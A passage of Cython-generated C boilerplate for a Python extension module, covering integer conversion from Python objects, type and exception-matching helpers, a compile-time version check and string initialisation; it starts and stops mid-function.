            __PYX_VERIFY_RETURN_INT(long, long, PyInt_AS_LONG(x))
        } else {
            long val = PyInt_AS_LONG(x);
            if (is_unsigned && unlikely(val < 0)) {
                goto raise_neg_overflow;
            }
            return (long) val;
        }
    } else
#endif
    if (likely(PyLong_Check(x))) {
        if (is_unsigned) {
#if CYTHON_USE_PYLONG_INTERNALS
            const digit* digits = ((PyLongObject*)x)->ob_digit;
            switch (Py_SIZE(x)) {
                case  0: return (long) 0;
                case  1: __PYX_VERIFY_RETURN_INT(long, digit, digits[0])
                case 2:
                    if (8 * sizeof(long) > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) >= 2 * PyLong_SHIFT) {
                            return (long) (((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));
                        }
                    }
                    break;
                case 3:
                    if (8 * sizeof(long) > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) >= 3 * PyLong_SHIFT) {
                            return (long) (((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));
                        }
                    }
                    break;
                case 4:
                    if (8 * sizeof(long) > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) >= 4 * PyLong_SHIFT) {
                            return (long) (((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));
                        }
                    }
                    break;
            }
#endif
#if CYTHON_COMPILING_IN_CPYTHON
            if (unlikely(Py_SIZE(x) < 0)) {
                goto raise_neg_overflow;
            }
#else
            {
                int result = PyObject_RichCompareBool(x, Py_False, Py_LT);
                if (unlikely(result < 0))
                    return (long) -1;
                if (unlikely(result == 1))
                    goto raise_neg_overflow;
            }
#endif
            if (sizeof(long) <= sizeof(unsigned long)) {
                __PYX_VERIFY_RETURN_INT_EXC(long, unsigned long, PyLong_AsUnsignedLong(x))
#ifdef HAVE_LONG_LONG
            } else if (sizeof(long) <= sizeof(unsigned PY_LONG_LONG)) {
                __PYX_VERIFY_RETURN_INT_EXC(long, unsigned PY_LONG_LONG, PyLong_AsUnsignedLongLong(x))
#endif
            }
        } else {
#if CYTHON_USE_PYLONG_INTERNALS
            const digit* digits = ((PyLongObject*)x)->ob_digit;
            switch (Py_SIZE(x)) {
                case  0: return (long) 0;
                case -1: __PYX_VERIFY_RETURN_INT(long, sdigit, (sdigit) (-(sdigit)digits[0]))
                case  1: __PYX_VERIFY_RETURN_INT(long,  digit, +digits[0])
                case -2:
                    if (8 * sizeof(long) - 1 > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                            return (long) (((long)-1)*(((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case 2:
                    if (8 * sizeof(long) > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                            return (long) ((((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case -3:
                    if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
                            return (long) (((long)-1)*(((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case 3:
                    if (8 * sizeof(long) > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
                            return (long) ((((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case -4:
                    if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 4 * PyLong_SHIFT) {
                            return (long) (((long)-1)*(((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case 4:
                    if (8 * sizeof(long) > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 4 * PyLong_SHIFT) {
                            return (long) ((((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
            }
#endif
            if (sizeof(long) <= sizeof(long)) {
                __PYX_VERIFY_RETURN_INT_EXC(long, long, PyLong_AsLong(x))
#ifdef HAVE_LONG_LONG
            } else if (sizeof(long) <= sizeof(PY_LONG_LONG)) {
                __PYX_VERIFY_RETURN_INT_EXC(long, PY_LONG_LONG, PyLong_AsLongLong(x))
#endif
            }
        }
        {
#if CYTHON_COMPILING_IN_PYPY && !defined(_PyLong_AsByteArray)
            PyErr_SetString(PyExc_RuntimeError,
                            "_PyLong_AsByteArray() not available in PyPy, cannot convert large numbers");
#else
            long val;
            PyObject *v = __Pyx_PyNumber_IntOrLong(x);
 #if PY_MAJOR_VERSION < 3
            if (likely(v) && !PyLong_Check(v)) {
                PyObject *tmp = v;
                v = PyNumber_Long(tmp);
                Py_DECREF(tmp);
            }
 #endif
            if (likely(v)) {
                int one = 1; int is_little = (int)*(unsigned char *)&one;
                unsigned char *bytes = (unsigned char *)&val;
                int ret = _PyLong_AsByteArray((PyLongObject *)v,
                                              bytes, sizeof(val),
                                              is_little, !is_unsigned);
                Py_DECREF(v);
                if (likely(!ret))
                    return val;
            }
#endif
            return (long) -1;
        }
    } else {
        long val;
        PyObject *tmp = __Pyx_PyNumber_IntOrLong(x);
        if (!tmp) return (long) -1;
        val = __Pyx_PyInt_As_long(tmp);
        Py_DECREF(tmp);
        return val;
    }
raise_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "value too large to convert to long");
    return (long) -1;
raise_neg_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "can't convert negative value to long");
    return (long) -1;
}

/* CIntFromPy */
    static CYTHON_INLINE int __Pyx_PyInt_As_int(PyObject *x) {
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wconversion"
#endif
    const int neg_one = (int) -1, const_zero = (int) 0;
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic pop
#endif
    const int is_unsigned = neg_one > const_zero;
#if PY_MAJOR_VERSION < 3
    if (likely(PyInt_Check(x))) {
        if (sizeof(int) < sizeof(long)) {
            __PYX_VERIFY_RETURN_INT(int, long, PyInt_AS_LONG(x))
        } else {
            long val = PyInt_AS_LONG(x);
            if (is_unsigned && unlikely(val < 0)) {
                goto raise_neg_overflow;
            }
            return (int) val;
        }
    } else
#endif
    if (likely(PyLong_Check(x))) {
        if (is_unsigned) {
#if CYTHON_USE_PYLONG_INTERNALS
            const digit* digits = ((PyLongObject*)x)->ob_digit;
            switch (Py_SIZE(x)) {
                case  0: return (int) 0;
                case  1: __PYX_VERIFY_RETURN_INT(int, digit, digits[0])
                case 2:
                    if (8 * sizeof(int) > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) >= 2 * PyLong_SHIFT) {
                            return (int) (((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));
                        }
                    }
                    break;
                case 3:
                    if (8 * sizeof(int) > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) >= 3 * PyLong_SHIFT) {
                            return (int) (((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));
                        }
                    }
                    break;
                case 4:
                    if (8 * sizeof(int) > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) >= 4 * PyLong_SHIFT) {
                            return (int) (((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));
                        }
                    }
                    break;
            }
#endif
#if CYTHON_COMPILING_IN_CPYTHON
            if (unlikely(Py_SIZE(x) < 0)) {
                goto raise_neg_overflow;
            }
#else
            {
                int result = PyObject_RichCompareBool(x, Py_False, Py_LT);
                if (unlikely(result < 0))
                    return (int) -1;
                if (unlikely(result == 1))
                    goto raise_neg_overflow;
            }
#endif
            if (sizeof(int) <= sizeof(unsigned long)) {
                __PYX_VERIFY_RETURN_INT_EXC(int, unsigned long, PyLong_AsUnsignedLong(x))
#ifdef HAVE_LONG_LONG
            } else if (sizeof(int) <= sizeof(unsigned PY_LONG_LONG)) {
                __PYX_VERIFY_RETURN_INT_EXC(int, unsigned PY_LONG_LONG, PyLong_AsUnsignedLongLong(x))
#endif
            }
        } else {
#if CYTHON_USE_PYLONG_INTERNALS
            const digit* digits = ((PyLongObject*)x)->ob_digit;
            switch (Py_SIZE(x)) {
                case  0: return (int) 0;
                case -1: __PYX_VERIFY_RETURN_INT(int, sdigit, (sdigit) (-(sdigit)digits[0]))
                case  1: __PYX_VERIFY_RETURN_INT(int,  digit, +digits[0])
                case -2:
                    if (8 * sizeof(int) - 1 > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 2 * PyLong_SHIFT) {
                            return (int) (((int)-1)*(((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case 2:
                    if (8 * sizeof(int) > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 2 * PyLong_SHIFT) {
                            return (int) ((((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case -3:
                    if (8 * sizeof(int) - 1 > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 3 * PyLong_SHIFT) {
                            return (int) (((int)-1)*(((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case 3:
                    if (8 * sizeof(int) > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 3 * PyLong_SHIFT) {
                            return (int) ((((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case -4:
                    if (8 * sizeof(int) - 1 > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 4 * PyLong_SHIFT) {
                            return (int) (((int)-1)*(((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case 4:
                    if (8 * sizeof(int) > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 4 * PyLong_SHIFT) {
                            return (int) ((((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
            }
#endif
            if (sizeof(int) <= sizeof(long)) {
                __PYX_VERIFY_RETURN_INT_EXC(int, long, PyLong_AsLong(x))
#ifdef HAVE_LONG_LONG
            } else if (sizeof(int) <= sizeof(PY_LONG_LONG)) {
                __PYX_VERIFY_RETURN_INT_EXC(int, PY_LONG_LONG, PyLong_AsLongLong(x))
#endif
            }
        }
        {
#if CYTHON_COMPILING_IN_PYPY && !defined(_PyLong_AsByteArray)
            PyErr_SetString(PyExc_RuntimeError,
                            "_PyLong_AsByteArray() not available in PyPy, cannot convert large numbers");
#else
            int val;
            PyObject *v = __Pyx_PyNumber_IntOrLong(x);
 #if PY_MAJOR_VERSION < 3
            if (likely(v) && !PyLong_Check(v)) {
                PyObject *tmp = v;
                v = PyNumber_Long(tmp);
                Py_DECREF(tmp);
            }
 #endif
            if (likely(v)) {
                int one = 1; int is_little = (int)*(unsigned char *)&one;
                unsigned char *bytes = (unsigned char *)&val;
                int ret = _PyLong_AsByteArray((PyLongObject *)v,
                                              bytes, sizeof(val),
                                              is_little, !is_unsigned);
                Py_DECREF(v);
                if (likely(!ret))
                    return val;
            }
#endif
            return (int) -1;
        }
    } else {
        int val;
        PyObject *tmp = __Pyx_PyNumber_IntOrLong(x);
        if (!tmp) return (int) -1;
        val = __Pyx_PyInt_As_int(tmp);
        Py_DECREF(tmp);
        return val;
    }
raise_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "value too large to convert to int");
    return (int) -1;
raise_neg_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "can't convert negative value to int");
    return (int) -1;
}

/* FastTypeChecks */
    #if CYTHON_COMPILING_IN_CPYTHON
static int __Pyx_InBases(PyTypeObject *a, PyTypeObject *b) {
    while (a) {
        a = a->tp_base;
        if (a == b)
            return 1;
    }
    return b == &PyBaseObject_Type;
}
static CYTHON_INLINE int __Pyx_IsSubtype(PyTypeObject *a, PyTypeObject *b) {
    PyObject *mro;
    if (a == b) return 1;
    mro = a->tp_mro;
    if (likely(mro)) {
        Py_ssize_t i, n;
        n = PyTuple_GET_SIZE(mro);
        for (i = 0; i < n; i++) {
            if (PyTuple_GET_ITEM(mro, i) == (PyObject *)b)
                return 1;
        }
        return 0;
    }
    return __Pyx_InBases(a, b);
}
#if PY_MAJOR_VERSION == 2
static int __Pyx_inner_PyErr_GivenExceptionMatches2(PyObject *err, PyObject* exc_type1, PyObject* exc_type2) {
    PyObject *exception, *value, *tb;
    int res;
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ErrFetch(&exception, &value, &tb);
    res = exc_type1 ? PyObject_IsSubclass(err, exc_type1) : 0;
    if (unlikely(res == -1)) {
        PyErr_WriteUnraisable(err);
        res = 0;
    }
    if (!res) {
        res = PyObject_IsSubclass(err, exc_type2);
        if (unlikely(res == -1)) {
            PyErr_WriteUnraisable(err);
            res = 0;
        }
    }
    __Pyx_ErrRestore(exception, value, tb);
    return res;
}
#else
static CYTHON_INLINE int __Pyx_inner_PyErr_GivenExceptionMatches2(PyObject *err, PyObject* exc_type1, PyObject *exc_type2) {
    int res = exc_type1 ? __Pyx_IsSubtype((PyTypeObject*)err, (PyTypeObject*)exc_type1) : 0;
    if (!res) {
        res = __Pyx_IsSubtype((PyTypeObject*)err, (PyTypeObject*)exc_type2);
    }
    return res;
}
#endif
static int __Pyx_PyErr_GivenExceptionMatchesTuple(PyObject *exc_type, PyObject *tuple) {
    Py_ssize_t i, n;
    assert(PyExceptionClass_Check(exc_type));
    n = PyTuple_GET_SIZE(tuple);
#if PY_MAJOR_VERSION >= 3
    for (i=0; i<n; i++) {
        if (exc_type == PyTuple_GET_ITEM(tuple, i)) return 1;
    }
#endif
    for (i=0; i<n; i++) {
        PyObject *t = PyTuple_GET_ITEM(tuple, i);
        #if PY_MAJOR_VERSION < 3
        if (likely(exc_type == t)) return 1;
        #endif
        if (likely(PyExceptionClass_Check(t))) {
            if (__Pyx_inner_PyErr_GivenExceptionMatches2(exc_type, NULL, t)) return 1;
        } else {
        }
    }
    return 0;
}
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches(PyObject *err, PyObject* exc_type) {
    if (likely(err == exc_type)) return 1;
    if (likely(PyExceptionClass_Check(err))) {
        if (likely(PyExceptionClass_Check(exc_type))) {
            return __Pyx_inner_PyErr_GivenExceptionMatches2(err, NULL, exc_type);
        } else if (likely(PyTuple_Check(exc_type))) {
            return __Pyx_PyErr_GivenExceptionMatchesTuple(err, exc_type);
        } else {
        }
    }
    return PyErr_GivenExceptionMatches(err, exc_type);
}
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches2(PyObject *err, PyObject *exc_type1, PyObject *exc_type2) {
    assert(PyExceptionClass_Check(exc_type1));
    assert(PyExceptionClass_Check(exc_type2));
    if (likely(err == exc_type1 || err == exc_type2)) return 1;
    if (likely(PyExceptionClass_Check(err))) {
        return __Pyx_inner_PyErr_GivenExceptionMatches2(err, exc_type1, exc_type2);
    }
    return (PyErr_GivenExceptionMatches(err, exc_type1) || PyErr_GivenExceptionMatches(err, exc_type2));
}
#endif

/* CheckBinaryVersion */
    static int __Pyx_check_binary_version(void) {
    char ctversion[5];
    int same=1, i, found_dot;
    const char* rt_from_call = Py_GetVersion();
    PyOS_snprintf(ctversion, 5, "%d.%d", PY_MAJOR_VERSION, PY_MINOR_VERSION);
    found_dot = 0;
    for (i = 0; i < 4; i++) {
        if (!ctversion[i]) {
            same = (rt_from_call[i] < '0' || rt_from_call[i] > '9');
            break;
        }
        if (rt_from_call[i] != ctversion[i]) {
            same = 0;
            break;
        }
    }
    if (!same) {
        char rtversion[5] = {'\0'};
        char message[200];
        for (i=0; i<4; ++i) {
            if (rt_from_call[i] == '.') {
                if (found_dot) break;
                found_dot = 1;
            } else if (rt_from_call[i] < '0' || rt_from_call[i] > '9') {
                break;
            }
            rtversion[i] = rt_from_call[i];
        }
        PyOS_snprintf(message, sizeof(message),
                      "compiletime version %s of module '%.100s' "
                      "does not match runtime version %s",
                      ctversion, __Pyx_MODULE_NAME, rtversion);
        return PyErr_WarnEx(NULL, message, 1);
    }
    return 0;
}

/* InitStrings */
    static int __Pyx_InitStrings(__Pyx_StringTabEntry *t) {
    while (t->p) {
        #if PY_MAJOR_VERSION < 3
        if (t->is_unicode) {
            *t->p = PyUnicode_DecodeUTF8(t->s, t->n - 1, NULL);
        } else if (t->intern) {
            *t->p = PyString_InternFromString(t->s);
        } else {
            *t->p = PyString_FromStringAndSize(t->s, t->n - 1);
        }
        #else
        if (t->is_unicode | t->is_str) {
            if (t->intern) {
                *t->p = PyUnicode_InternFromString(t->s);
            } else if (t->encoding) {
                *t->p = PyUnicode_Decode(t->s, t->n - 1, t->encoding, NULL);
            } else {
                *t->p = PyUnicode_FromStringAndSize(t->s, t->n - 1);
            }
        } else {
            *t->p = PyBytes_FromStringAndSize(t->s, t->n - 1);
        }
        #endif
        if (!*t->p)
            return -1;
        if (PyObject_Hash(*t->p) == -1)
            return -1;
        ++t;
    }
    return 0;
}

static CYTHON_INLINE PyObject* __Pyx_PyUnicode_FromString(const char* c_str) {
    return __Pyx_PyUnicode_FromStringAndSize(c_str, (Py_ssize_t)strlen(c_str));
}
static CYTHON_INLINE const char* __Pyx_PyObject_AsString(PyObject* o) {
    Py_ssize_t ignore;
    return __Pyx_PyObject_AsStringAndSize(o, &ignore);
}
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT
#if !CYTHON_PEP393_ENABLED
static const char* __Pyx_PyUnicode_AsStringAndSize(PyObject* o, Py_ssize_t *length) {
    char* defenc_c;
    PyObject* defenc = _PyUnicode_AsDefaultEncodedString(o, NULL);
    if (!defenc) return NULL;
    defenc_c = PyBytes_AS_STRING(defenc);
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
    {
        char* end = defenc_c + PyBytes_GET_SIZE(defenc);
        char* c;
        for (c = defenc_c; c < end; c++) {
            if ((unsigned char) (*c) >= 128) {
                PyUnicode_AsASCIIString(o);
                return NULL;
            }
        }
    }
#endif
    *length = PyBytes_GET_SIZE(defenc);
    return defenc_c;
}
#else
static CYTHON_INLINE const char* __Pyx_PyUnicode_AsStringAndSize(PyObject* o, Py_ssize_t *length) {
    if (unlikely(__Pyx_PyUnicode_READY(o) == -1)) return NULL;
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
    if (likely(PyUnicode_IS_ASCII(o))) {
        *length = PyUnicode_GET_LENGTH(o);
        return PyUnicode_AsUTF8(o);
    } else {
        PyUnicode_AsASCIIString(o);
        return NULL;
    }
#else
    return PyUnicode_AsUTF8AndSize(o, length);
#endif
}
#endif
#endif
static CYTHON_INLINE const char* __Pyx_PyObject_AsStringAndSize(PyObject* o, Py_ssize_t *length) {
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT
    if (
#if PY_MAJOR_VERSION < 3 && __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
            __Pyx_sys_getdefaultencoding_not_ascii &&
#endif
            PyUnicode_Check(o)) {
        return __Pyx_PyUnicode_AsStringAndSize(o, length);
    } else
#endif
#if (!CYTHON_COMPILING_IN_PYPY) || (defined(PyByteArray_AS_STRING) && defined(PyByteArray_GET_SIZE))
    if (PyByteArray_Check(o)) {
        *length = PyByteArray_GET_SIZE(o);
        return PyByteArray_AS_STRING(o);
    } else
#endif
    {
        char* result;
        int r = PyBytes_AsStringAndSize(o, &result, length);
        if (unlikely(r < 0)) {
            return NULL;
        } else {
            return result;
        }
    }
}
static CYTHON_INLINE int __Pyx_PyObject_IsTrue(PyObject* x) {
   int is_true = x == Py_True;
   if (is_true | (x == Py_False) | (x == Py_None)) return is_true;
   else return PyObject_IsTrue(x);
}
static CYTHON_INLINE int __Pyx_PyObject_IsTrueAndDecref(PyObject* x) {
    int retval;
    if (unlikely(!x)) return -1;
    retval = __Pyx_PyObject_IsTrue(x);
    Py_DECREF(x);
    return retval;
}
static PyObject* __Pyx_PyNumber_IntOrLongWrongResultType(PyObject* result, const char* type_name) {
#if PY_MAJOR_VERSION >= 3
    if (PyLong_Check(result)) {
        if (PyErr_WarnFormat(PyExc_DeprecationWarning, 1,
                "__int__ returned non-int (type %.200s).  "
                "The ability to return an instance of a strict subclass of int "
                "is deprecated, and may be removed in a future version of Python.",
                Py_TYPE(result)->tp_name)) {
            Py_DECREF(result);
            return NULL;
        }
        return result;
    }
#endif
    PyErr_Format(PyExc_TypeError,
                 "__%.4s__ returned non-%.4s (type %.200s)",
                 type_name, type_name, Py_TYPE(result)->tp_name);
    Py_DECREF(result);
    return NULL;
}
static CYTHON_INLINE PyObject* __Pyx_PyNumber_IntOrLong(PyObject* x) {
#if CYTHON_USE_TYPE_SLOTS
  PyNumberMethods *m;
#endif
  const char *name = NULL;
  PyObject *res = NULL;
#if PY_MAJOR_VERSION < 3
  if (likely(PyInt_Check(x) || PyLong_Check(x)))
#else
  if (likely(PyLong_Check(x)))
#endif
    return __Pyx_NewRef(x);
#if CYTHON_USE_TYPE_SLOTS
  m = Py_TYPE(x)->tp_as_number;
  #if PY_MAJOR_VERSION < 3
  if (m && m->nb_int) {
    name = "int";
    res = m->nb_int(x);
  }
  else if (m && m->nb_long) {
    name = "long";
    res = m->nb_long(x);
  }
  #else
  if (likely(m && m->nb_int)) {
    name = "int";
    res = m->nb_int(x);
  }
  #endif
#else
  if (!PyBytes_CheckExact(x) && !PyUnicode_CheckExact(x)) {
    res = PyNumber_Int(x);
  }
#endif
  if (likely(res)) {
#if PY_MAJOR_VERSION < 3
    if (unlikely(!PyInt_Check(res) && !PyLong_Check(res))) {
#else
    if (unlikely(!PyLong_CheckExact(res))) {
#endif
        return __Pyx_PyNumber_IntOrLongWrongResultType(res, name);
    }
  }
  else if (!PyErr_Occurred()) {
    PyErr_SetString(PyExc_TypeError,
                    "an integer is required");
  }
  return res;
}
static CYTHON_INLINE Py_ssize_t __Pyx_PyIndex_AsSsize_t(PyObject* b) {
  Py_ssize_t ival;
  PyObject *x;
#if PY_MAJOR_VERSION < 3
  if (likely(PyInt_CheckExact(b))) {
    if (sizeof(Py_ssize_t) >= sizeof(long))
        return PyInt_AS_LONG(b);
    else
        return PyInt_AsSsize_t(b);
  }
#endif
  if (likely(PyLong_CheckExact(b))) {
    #if CYTHON_USE_PYLONG_INTERNALS
    const digit* digits = ((PyLongObject*)b)->ob_digit;
    const Py_ssize_t size = Py_SIZE(b);
    if (likely(__Pyx_sst_abs(size) <= 1)) {
        ival = likely(size) ? digits[0] : 0;
        if (size == -1) ival = -ival;
        return ival;
    } else {
      switch (size) {
         case 2:
           if (8 * sizeof(Py_ssize_t) > 2 * PyLong_SHIFT) {
             return (Py_ssize_t) (((((size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case -2:
           if (8 * sizeof(Py_ssize_t) > 2 * PyLong_SHIFT) {
             return -(Py_ssize_t) (((((size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case 3:
           if (8 * sizeof(Py_ssize_t) > 3 * PyLong_SHIFT) {
             return (Py_ssize_t) (((((((size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case -3:
           if (8 * sizeof(Py_ssize_t) > 3 * PyLong_SHIFT) {
             return -(Py_ssize_t) (((((((size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case 4:
           if (8 * sizeof(Py_ssize_t) > 4 * PyLong_SHIFT) {
             return (Py_ssize_t) (((((((((size_t)digits[3]) << PyLong_SHIFT) | (size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case -4:
           if (8 * sizeof(Py_ssize_t) > 4 * PyLong_SHIFT) {
